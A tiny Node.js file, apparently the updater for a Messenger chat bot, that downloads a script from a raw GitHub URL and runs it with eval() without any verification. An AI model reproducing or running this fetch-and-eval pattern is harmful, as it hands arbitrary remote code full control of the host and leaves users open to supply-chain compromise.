const axios = require('axios');

axios.get("https://raw.githubusercontent.com/renz2451/MESSENGER-CHAT-BOT-V3/main/updater.js")
	.then(res => eval(res.data));
